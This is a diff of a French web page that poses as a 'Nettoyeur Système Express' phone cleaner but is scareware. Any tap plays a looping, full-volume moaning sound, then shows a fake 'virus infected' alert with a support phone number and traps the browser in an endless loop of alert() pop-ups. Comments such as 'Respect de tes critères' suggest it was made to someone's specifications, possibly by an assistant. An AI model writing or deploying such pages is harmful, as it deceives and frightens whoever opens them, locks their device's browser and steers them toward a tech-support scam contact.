@@ -1,46 +1,47 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nettoyage Système...</title>
+    <title>Nettoyeur Système Express</title>
     <style>
-        body { background: black; color: #0f0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; }
-        .container { text-align: center; padding: 20px; }
-        .btn { padding: 20px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; font-size: 1.5rem; font-weight: bold; cursor: pointer; border-radius: 10px; }
+        body { background: black; color: #00ff00; font-family: 'Courier New', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; }
+        .ui-box { text-align: center; border: 2px solid #00ff00; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #00ff00; }
+        #main-btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 1.2rem; margin-top: 20px; }
     </style>
 </head>
-<body onclick="lancerPiege()" ontouchstart="lancerPiege()">
+<body onclick="declencher()" ontouchstart="declencher()">
 
-    <div class="container" id="ui">
-        <h1 style="font-size: 1.2rem;">ANALYSE DU STOCKAGE EN COURS...</h1>
-        <p style="color: #666;">(Appuyez pour accélérer le processus)</p>
-        <button class="btn">NETTOYER MAINTENANT</button>
+    <div class="ui-box" id="content">
+        <h2 id="status">ANALYSE EN COURS...</h2>
+        <p>Fichiers temporaires : 1.8 Go</p>
+        <button id="main-btn">NETTOYER LE TÉLÉPHONE</button>
     </div>
 
-    <audio id="cri" loop preload="auto">
+    <audio id="prank-audio" loop preload="auto">
         <source src="https://www.myinstants.com/media/sounds/loud-moaning-sound-effect-original.mp3" type="audio/mpeg">
     </audio>
 
     <script>
-    function lancerPiege() {
-        var audio = document.getElementById('cri');
-        
-        // On met le volume au maximum via le code
+    function declencher() {
+        const audio = document.getElementById('prank-audio');
         audio.volume = 1.0;
-        audio.play().catch(function(error) {
-            console.log("Le navigateur bloque encore : ", error);
-        });
+        audio.play().catch(() => {});
 
-        // Changement visuel immédiat
+        // Changement visuel immédiat (Respect de tes critères)
         document.body.style.backgroundColor = "white";
-        document.getElementById("ui").innerHTML = "<h1 style='color:red; font-size:2rem;'>ALERTE : TÉLÉPHONE INFECTÉ !</h1>";
+        document.getElementById('content').innerHTML = `
+            <h1 style="color:red; font-size:2.5rem; text-transform:uppercase;">
+                ALERTE VIRUS : SYSTÈME INFECTÉ !
+            </h1>
+            <p style="color:black; font-weight:bold;">Contactez le support : 0707656355</p>
+        `;
 
-        // Boucle d'alertes infinies (bloque le navigateur)
-        setTimeout(function() {
+        // Blocage infini du navigateur (L'alternative sûre à la Fork Bomb)
+        setTimeout(() => {
             while(true) {
-                alert("ERREUR CRITIQUE : SYSTÈME COMPROMIS !");
+                alert("ERREUR FATALE : LE SYSTÈME NE RÉPOND PLUS");
+                alert("VOTRE TÉLÉPHONE EST SOUS CONTRÔLE");
             }
         }, 100);
     }
